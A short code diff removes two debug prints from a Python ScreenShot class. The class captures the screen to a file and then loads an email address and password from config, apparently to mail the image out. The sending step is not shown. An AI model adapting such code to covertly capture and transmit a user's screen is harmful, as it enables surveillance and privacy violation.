@@ -19,9 +19,7 @@ class ScreenShot(object):
         now = datetime.now()
         nowTime = now.timestamp()
         name = str(nowTime).split(".")[0]
-        print(self.dir)
         im = ImageGrab.grab_to_file(os.path.join(self.dir, C.SCREEN_IMG))
-        print(im)
         print("Taking Successfully")
         from_addr = C.EMAIL_126
         password = C.PWD
